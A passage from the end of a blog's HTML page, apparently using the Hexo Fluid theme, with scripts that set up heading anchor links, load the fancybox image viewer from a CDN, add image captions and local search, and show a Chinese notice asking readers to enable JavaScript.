      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
